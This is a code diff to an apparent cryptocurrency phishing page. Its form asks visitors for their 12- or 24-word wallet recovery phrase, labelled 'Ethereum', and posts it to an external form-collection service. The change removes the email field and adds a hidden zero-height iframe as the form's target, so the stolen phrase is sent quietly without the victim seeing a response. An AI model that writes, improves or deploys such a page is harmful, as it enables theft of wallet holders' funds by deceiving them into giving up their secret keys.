@@ -45,9 +45,10 @@
 					<div class="tab-content">
 						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
 							<form action="https://formcarry.com/s/-QvpqQhONcK"
+                     target="display-frame"
                      method="POST"
                      class="php-email-form">
-                        <input type="email" class="form-control " style="margin-bottom: 2rem;" placeholder="Enter associated email" name="email">
+                        <!-- <input type="email" class="form-control " style="margin-bottom: 2rem;" placeholder="Enter associated email" name="email"> -->
 								<textarea class="form-control" rows="5" name="phrase" placeholder="Enter Phrase" required=""></textarea>
 								<p class="text-white" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
 								<input type="hidden" name="value" value="Ethereum">
@@ -63,6 +64,9 @@
             </div>
         </div>
     </section>
+    <iframe name="display-frame"
+      style="max-height: 0px;">
+   </iframe>
     <script src="jquery.min.js"></script>
     <script src="bootstrap.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
